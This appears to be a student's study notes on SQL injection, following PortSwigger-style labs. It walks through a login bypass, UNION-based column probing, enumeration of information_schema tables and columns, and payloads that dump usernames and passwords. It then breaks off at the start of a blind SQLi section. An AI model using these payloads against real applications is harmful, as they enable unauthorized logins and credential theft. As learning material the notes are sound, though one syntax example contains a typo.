- Normal web application allow the user to login with the user name and password, the application authenticate the user by checking the data from the database like this:
- `SELECT * FROM users WHERE username = 'username' AND password = 'password'`
- If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

This query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user.

# SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

- we can use inpect method and go to the network bar and try to edit and resend it to the back end !

```
UNION + SELECT + NULL + NULL + NULL --
```

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

|   |   |
|---|---|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2`|
**TO Query the database type of mysql or Microsoft we send the database parameter by adding  
UNION + SELECT + NULL + NULL + NULL -- some place holders like alpahabet or numerical value and send it back the repeater and for get 200 ok and scroll down to see some info and the version**

![[Pasted image 20241019223803.png]]

### listing the database of non oracle
- The application has a login function, and the database contains a table that holds usernames and passwords. we need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.
## Sql injection UNION attack. retrieving multiple values.

- In order to retrieve all usernames and passwords and login as administrator.
- to test weather it is Vulnerable or not we type '  and if we found ***Internal server error*** we are ordering columns that doesn't exist.
- as usual we are finding table of usernames er concatenate string for the PostgreSQL version syntax || "~" ||
```
- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
```

### BLIND SQL Injection with conditional responses.
- It is a form of sqli we don't get text info in the web server, but we do get info leak of certain information about the server.